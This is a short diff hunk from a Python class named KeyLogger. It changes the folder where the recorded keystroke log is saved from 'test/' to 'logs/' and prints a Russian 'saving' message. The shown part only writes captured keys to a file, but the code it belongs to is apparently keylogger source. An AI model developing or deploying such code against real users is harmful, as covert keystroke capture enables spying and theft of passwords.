@@ -34,7 +34,7 @@ class KeyLogger:
 
     def report_file(self):
         filename = self.name_file()
-        with open(f'test/{filename}.txt', 'w') as f:
+        with open(f'logs/{filename}.txt', 'w') as f:
             print(self.log, file=f)
         print(f'Сохранение {filename}.txt')
 
